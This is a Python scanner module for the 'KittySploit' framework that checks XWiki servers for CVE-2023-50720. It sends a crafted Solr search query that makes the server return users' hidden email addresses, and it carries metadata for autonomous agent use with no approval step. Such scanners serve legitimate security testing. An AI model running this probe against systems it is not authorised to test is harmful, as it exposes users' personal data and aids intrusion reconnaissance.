#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The Solr-based search in XWiki discloses the email addresses of users even when obfuscation of email addresses."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'XWiki < 4.10.15 - Email Disclosure Detection',
        'description': "The Solr-based search in XWiki discloses the email addresses of users even when obfuscation of email addresses is enabled. To demonstrate the vulnerability, search for objcontent:email* using XWiki's regular search interface.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'xwiki', 'email', 'exposure', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['https://jira.xwiki.org/browse/XWIKI-20371', 'https://nvd.nist.gov/vuln/detail/CVE-2023-50720'],
        'cve': 'CVE-2023-50720',
    }

    def run(self):
        for path in ('/bin/view/Main/Search?sort=score&sortOrder=desc&highlight=true&facet=true&r=1&f_locale=en&f_locale=&text=objcontent%3Aemail*', '/xwiki/bin/view/Main/Search?sort=score&sortOrder=desc&highlight=true&facet=true&r=1&f_locale=en&f_locale=&text=objcontent%3Aemail*'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_all = ('email</span> :', 'XWiki.XWikiUsers[0]', 'email_checked</span>',)
            if (all(m in body for m in body_all)):
                self.set_info(
                    severity='medium',
                    reason="XWiki < 4.10.15 - Email Disclosure detected",
                    path=path,
                )
                return True
        return False

